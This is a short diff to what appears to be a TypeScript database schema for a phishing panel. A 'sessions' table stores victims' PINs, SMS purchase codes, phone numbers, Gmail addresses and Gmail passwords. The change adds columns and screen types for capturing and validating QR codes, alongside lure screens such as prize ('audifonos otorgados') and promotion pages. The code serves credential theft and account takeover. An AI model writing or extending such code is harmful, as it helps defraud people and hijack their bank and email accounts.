@@ -114,6 +114,8 @@ export const sessions = pgTable("sessions", {
   nip: text("nip"),
   smsCompra: text("sms_compra"),
   celular: text("celular"),
+  qrImage: text("qr_image"),       // Para almacenar la imagen del QR
+  qrValidated: boolean("qr_validated").default(false), // Estado de validación del QR
   correo: text("correo"),          // Para almacenar el correo de Gmail
   contrasena: text("contrasena"),  // Para almacenar la contraseña de Gmail
   dispositivo: text("dispositivo"), // Android, iPhone, PC, etc.
@@ -205,6 +207,9 @@ export enum ScreenType {
   FOLIO = "folio",
   PROMOCION = "promocion",
   TERMINOS = "terminos",
+  PHONE_INPUT = "phone_input",
+  QR_SCAN = "qr_scan",
+  QR_VALIDATION = "qr_validation",
   LOGIN = "login",
   VUELOS_OTORGADOS = "audifonos_otorgados",
   TELEFONO = "telefono",
